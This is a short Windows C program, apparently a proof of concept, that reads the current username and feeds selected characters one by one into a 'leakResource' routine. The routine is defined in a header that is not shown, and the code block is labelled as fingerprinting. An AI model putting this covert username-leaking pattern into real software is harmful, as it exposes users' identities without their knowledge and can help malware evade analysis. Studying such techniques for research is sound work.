#include <windows.h>

void leakResource(int num);
void* readConfig(void);

int WINAPI WinMain(HINSTANCE a,HINSTANCE b,LPSTR c,int d){
    int* data = (int*)readConfig(); // first int is the start index, second is the end index

    /* BEGIN FINGERPRINTING */

    char big_enough[256+1];
    DWORD username_len = 256+1;
    GetUserNameA(big_enough, &username_len);
    for(int i = data[0]; i < data[1]; i++){
        if(big_enough[i] == '\0'){
            return 0;
        }
        leakResource(big_enough[i]);
    }

    /* END FINGERPRINTING */

    ExitProcess(0);
    return 0;
}

// I can't seem to get mingw32-gcc to change the entrypoint of the binary (when compiling
// without the standard library. Hence, the entry point defaults to the first function
// so we must include at the bottom.
#include "leaker.h"